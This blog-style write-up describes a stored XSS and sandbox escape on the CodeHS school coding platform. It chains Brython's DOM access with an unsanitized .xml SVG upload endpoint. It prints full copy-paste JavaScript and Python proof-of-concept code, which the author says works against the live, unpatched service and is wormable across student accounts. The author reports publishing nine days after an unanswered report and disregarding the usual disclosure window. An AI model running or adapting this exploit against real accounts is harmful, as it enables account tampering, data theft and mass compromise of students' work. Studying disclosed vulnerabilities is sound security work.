---
title: 'Breaking out of the CodeHS sandbox'
description: 'Upload sanitization? Hardly know her!'
pubDate: 'November 21 2026'
---

# Introduction

CodeHS is an education and learning platform for schools to teach their students Computer Science.
I won't go into detail about my personal gripes with it, but I will say a lot of the ways they handle
code sandboxing and execution are interesting, and generally pretty inconsistent.

They do this really weird thing where Python code is always run on an external server, *except* for
their *Python 3 Graphics* sandboxes, which instead use Brython, a Python interpreter entirely in JavaScript.

Brython has a module named `browser` to allow direct access to element's in the page's DOM, and also lets you
directly access JavaScript in the page. 

Normally, this would be fine, as CodeHS does proper sanitization and sandboxing across seemingly all of their HTML5 
and JavaScript sandboxes. But for some reason, in their Brython sandbox, this sanitization and proper sandboxing is seemingly absent. 

We can directly control the sandbox iframe in any way we want, including page navigation... without much sandboxing.
 
<img src="/assets/codehs/brython1.png" alt="Modification of the sandbox iframe from Brython." width="100%">

The CodeHS origin does however only allow same-origin execution, so CORS does prevent pretty much every possible XSS on the origin. 

This is seemingly a dead end unless we had some way to serve our own JavaScript directly on CodeHS's origin, which we obviously can't... *right*?

# User uploads

CodeHS lets users upload assets on certain sandbox types (HTML5 for example) for their programs, and this endpoint does sanitization that
prevents any of the following from being uploaded:
- HTML and PHP documents (`.htm(l)`, `.php`)
- JavaScript, TypeScript, etc scripts (`.js(x)`, `.ts(x)`, etc)
- XML documents with XHTML imports
- SVG documents with XHTML imports

So this seems fine, right? Surely there is no way to upload a malicious file onto their origin and execute any JS.

...Unless if they did something really stupid like not check the file extension properly and let someone upload an SVG document with the XHTML import
if it has the `.xml` file extension instead of `.svg`, without having CSP, `X-Content-Type-Options`, `nosniff`, or `Content-Disposition: Attachment`
which is exactly what they did. 

<img src="/assets/codehs/fileupload.png" alt="Uploading an SVG with the XHTML import and an embedded script." width="100%">

"*But Stella, what about the fact that this would require a seperate, HTML sandbox program to be made? What if I can't do that?*"

They don't check what type the currently open sandbox program is on their upload endpoint. Anyone with, say, access to their browser's developer tools
can call the API endpoint at `/core/ajax/upload_asset` directly with their payload (the endpoint accepts application/xml for some reason), and get a URL
back hosted directly on `https://codehs.com/uploads/<hash>`. Like so:

```javascript
(async () => {
  const PAYLOAD = `<svg xmlns="http://www.w3.org/2000/svg" width="460" height="140">
  <rect width="460" height="140" fill="#000000"/>
  <text x="20" y="70" fill="#fff" font-size="20">Hello from CodeHS origin</text>
  <script><![CDATA[
(function () {
  window.parent.eval(`alert(1)`);
  }
})();
  ]]></script>
</svg>`;

  const csrf = document.cookie.match(/csrftoken=([^;]+)/)?.[1] || "";
  const fd = new FormData();
  fd.append("file", new File([PAYLOAD], "poc.xml", { type: "application/xml" }));
  const r = await fetch("/core/ajax/upload_asset", {
    method: "POST",
    headers: { "X-CSRFToken": csrf },
    body: fd,
    credentials: "include"
  });
  const j = await r.json();
  if (j.status !== "ok") { console.error("upload failed:", j); return; }

  const PAYLOAD_URL = "https://codehs.com/uploads/" + j.url;
  console.log("payload URL:", PAYLOAD_URL);
})();
```

See the problem now?

We effectively have a stored script on CodeHS's origin, without CSP, or any headers preventing the browser from auto-executing the script inside of the SVG.
Since this script will run on the same-origin, CORS will not block any attempts to modify the top document at all. We can access `window.parent` and control it
however we may please.

# Using the stored XSS from our sandbox program

We have the script on their origin. How can we use it from Brython?

It's stupidly simple, in fact it's literally just *4 lines*:
```python
from browser import document
s = document.createElement("script")
s.textContent = "location.href = `https://codehs.com/uploads/<hash>`;"
document.body <= s
```

And all it takes for us to have complete control over the top-level origin is a singular click of the Run button.

<video src="/assets/codehs/poc.mp4" width="100%" alt="Proof of Concept video showcasing the stored XSS and sandbox escape." controls></video>

# So, just what can someone do with this exactly?

Quite a lot of malicious acts, actually. Since we have code execution on the CodeHS origin we can effectively do any action as the user who runs the sandbox program.

An attacker can modify sandbox programs of victims, delete their programs, delete accounts, exfiltrate data, etc. We have practically full control over the victim's
account, minus the fact that we can't grab their session cookie due to `HttpOnly`, which is the *only* mitigation against complete account takeover.

But notice how I mentioned being able to modify victim's sandbox programs? Of course, that means exactly what you would think it means. This sandbox escape is entirely
*wormable*, allowing mass compromise of CodeHS accounts. Obviously, this is terrible news for both CodeHS and any district that uses it, just imagine all of the
sensitive data effectively being public info...

As an added bonus, this does allow for a popup bypass since browsers consider any attempt to open a new window as user-actioned within 5 seconds of the executing click.

# Disclosure

I reported this vulnerability to CodeHS on November 12th, 2026... and never got a reply back, and they didn't even bother to patch the vulnerability.

This was really annoying to me since a vulnerability of this level (requiring minimal permissions, a singular click to exploit, and allows practically complete account
takeover and complete loss of confidentiality) is **CVSS 9.3**, which makes this vulnerability *Critical*. Irresponsibility like this is really upsetting, especially
when so much data is at stake. As of November 21th, 2026 (the time of writing), it has still not been patched.

I get that you're typically supposed to wait 90 days after notice to publicize a writeup but... I honestly don't care

# Proof of concept
This will upload an SVG that modifies the CodeHS top-level origin page, opens a new window bypassing the popup block, and list off the amount of cookies accessible.

From the developer tools console, logged in on any page:
```javascript
(async () => {
  // ---------- 1. The payload  ----------
  const PAYLOAD = `<svg xmlns="http://www.w3.org/2000/svg" width="460" height="140">
  <rect width="460" height="140" fill="#145a32"/>
  <text x="20" y="70" fill="#fff" font-size="20">Escaped to codehs.com origin</text>
  <script><![CDATA[
(function () {
  var P = window.parent, log = [];
  function htmlEl(tag) { return P.document.createElementNS("http://www.w3.org/1999/xhtml", tag); }

  try {
    // 1. Control the top-level document (CORS does not prevent this since same origin)
    P.document.title = "PWNED-FROM-SANDBOX-NO-INPUT";
    log.push("title-set-ok");

    var b = htmlEl("div");
    b.style.cssText = "position:fixed;top:0;left:0;right:0;z-index:2147483000;background:#c0392b;color:#fff;padding:10px;font:bold 15px sans-serif;text-align:center;";
    b.textContent = "pwned: sandbox code is now running on " + location.origin +
                    " with same-origin control of this editor page (zero user input)";
    (P.document.body || P.document.documentElement).appendChild(b);
    log.push("banner-appended");

    // 2. Popup bypass — works within ~5s of the last top-frame activation (Run click)
    var w = null;
    try { w = P.window.open("https://example.com/popup-from-escape", "_blank"); } catch (e1) {}
    P.console.log("[ESCAPE] window.open result:", w ? "OPENED (not blocked)" : "null (blocked)");
    log.push(w ? "popup-opened" : "popup-blocked");

    // 3. URL-bar masking on the top page
    try {
      P.history.replaceState(null, "", P.location.pathname + "?masked=demo");
      log.push("replaceState-ok");
    } catch (e2) { log.push("replaceState-failed"); }

    // 4. Top-origin cookies are readable (amount only, you shouldn't print values)
    var n = (P.document.cookie || "").split(";").filter(function (c) { return c.trim(); }).length;
    log.push("top-cookies-visible:" + n);

    P.console.log("[ESCAPE] chain log:", log.join(" | "));

    // 5. optional unconditional top-level tab hijack (no activation needed, always works)
    // P.location.href = "https://example.com/top-hijacked-by-sandbox";
  } catch (e) {
    P.console.log("[ESCAPE] FAILED:", e && e.message);
  }
})();
  ]]></script>
</svg>`;

  // ---------- 2. Upload (CSRF token auto-read from cookie) ----------
  const csrf = document.cookie.match(/csrftoken=([^;]+)/)?.[1] || "";
  const fd = new FormData();
  fd.append("file", new File([PAYLOAD], "poc.xml", { type: "application/xml" }));
  const r = await fetch("/core/ajax/upload_asset", {
    method: "POST",
    headers: { "X-CSRFToken": csrf },
    body: fd,
    credentials: "include"
  });
  const j = await r.json();
  if (j.status !== "ok") { console.error("upload failed:", j); return; }

  const PAYLOAD_URL = "https://codehs.com/uploads/" + j.url;
  console.log("payload URL:", PAYLOAD_URL);
})();
```

On your Brython sandbox:
```python
from browser import document
s = document.createElement("script");
s.textContent = "location.href = `https://codehs.com/uploads/<hash>`";
document.body <= s
```

Click run and watch the magic happen.

# Conclusion

Make sure you always set your serving headers properly if you plan on letting people upload whatever they want to your origin.
**Be better**. Don't make a fool out of yourself like CodeHS.

The exploit is named Codehscape.

# Credits
- Me - All findings above, this writeup
- CodeHS - For their incompetence ❤️
